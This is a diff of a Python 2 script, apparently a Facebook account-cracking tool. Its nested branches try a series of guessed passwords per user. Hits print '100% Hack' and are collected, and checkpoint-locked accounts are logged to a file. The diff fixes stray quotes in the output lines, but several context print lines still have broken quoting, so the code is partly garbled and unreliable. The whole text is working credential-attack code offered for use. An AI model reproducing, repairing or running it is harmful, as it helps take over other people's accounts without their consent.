@@ -327,7 +327,7 @@ def pilih_super():
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
 					print  "\x1b[1;94mcheckpoint\x1b[1;97m-\x1b"
-					print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+					print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 					print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 					print  "[1;97m✙\x1b[1;93m-' + pass1"
 					cek = open("out/checkpoint.txt", "a")
@@ -340,7 +340,7 @@ def pilih_super():
 					q = json.load(data)
 					if 'access_token' in q:
 						print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-						print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+						print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 						print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 						print  "[1;97m✙\x1b[1;91m-' + pass2"
 						oks.append(user+pass2)
@@ -360,14 +360,14 @@ def pilih_super():
 							q = json.load(data)
 							if 'access_token' in q:
 								print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-								print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+								print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 								print  "[1;97m✙\x1b[1;97m-' + user + '-\x1b"
 								print  "[1;97m✙\x1b[1;91m-' + pass3"
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
 									print  "\x1b[1;94mcheckpoint\x1b[1;97m-\x1b"
-									print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+									print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 									print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 									print  "[1;97m✙\x1b[1;93m-' + pass3"
 									cek = open("out/checkpoint.txt", "a")
@@ -380,7 +380,7 @@ def pilih_super():
 									q = json.load(data)
 									if 'access_token' in q:
 										print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-										print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+										print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 										print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 										print  "[1;97m✙\x1b[1;91m-' + pass4"
 										oks.append(user+pass4)
@@ -400,14 +400,14 @@ def pilih_super():
 											q = json.load(data)
 											if 'access_token' in q:
 												print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-												print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+												print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 												print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 												print  "[1;97m✙\x1b[1;91m-' + pass5"
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
 													print  "\x1b[1;94mcheckpoint\x1b[1;97m-\x1b"
-													print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+													print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 													print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 													print  "[1;97m✙\x1b[1;93m-' + pass5"
 													cek = open("out/checkpoint.txt", "a")
@@ -420,14 +420,14 @@ def pilih_super():
 													q = json.load(data)
 													if 'access_token' in q:
 														print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-														print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+														print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 														print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 														print  "[1;97m✙\x1b[1;91m-' + pass6"
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
 															print  "\x1b[1;94mcheckpoint\x1b[1;97m-\x1b"
-															print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+															print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 															print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 															print  "[1;97m✙\x1b[1;93m-' + pass6"
 															cek = open("out/checkpoint.txt", "a")
@@ -442,14 +442,14 @@ def pilih_super():
 															q = json.load(data)
 															if 'access_token' in q:
 																print  "\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b"
-																print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+																print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 																print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 																print  "[1;97m✙\x1b[1;91m-' + pass7"
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print  "\x1b[1;94mcheckpoint\x1b[1;97m-\x1b"
-																	print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+																	print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 																	print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 																	print  "[1;97m✙\x1b[1;93m-' + pass7"
 																	cek = open("out/checkpoint.txt", "a")
